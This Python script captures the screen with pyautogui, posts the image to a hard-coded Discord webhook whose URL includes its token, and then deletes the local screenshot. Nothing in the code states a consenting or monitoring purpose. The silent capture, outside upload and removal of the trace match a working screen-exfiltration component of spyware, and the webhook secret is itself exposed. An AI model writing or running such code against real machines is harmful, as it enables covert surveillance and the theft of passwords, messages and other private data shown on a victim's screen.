import pyautogui
import requests
import os
from datetime import datetime


# Function to take a screenshot
def take_screenshot():
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    filename = f'screenshot_{timestamp}.png'
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename


# Function to send the screenshot to a Discord channel
def send_to_discord(filename, url):
    with open(filename, 'rb') as f:
        payload = {'file': (filename, f, 'image/png')}
        response = requests.post(url, files=payload)
        if response.status_code == 200:
            print(f'Screenshot {filename} sent to Discord channel successfully.')
        else:
            print(
                f'Failed to send screenshot {filename} to Discord channel. Status code: {response.status_code}')


# Replace 'your_webhook_url' with the actual Discord webhook URL
webhook_url = 'https://discordapp.com/api/webhooks/1219008263127830678/UNNMVZlq11MRMYuTnQ5V0c3W4zAPviwSfKparI1cFxJkhBU7Jifv81a12JE3NT_2SOk2'

# Take a screenshot
screenshotFilename = take_screenshot()

# Send the screenshot to the Discord channel
send_to_discord(screenshotFilename, webhook_url)

# Clean up the screenshot file after sending
os.remove(screenshotFilename)
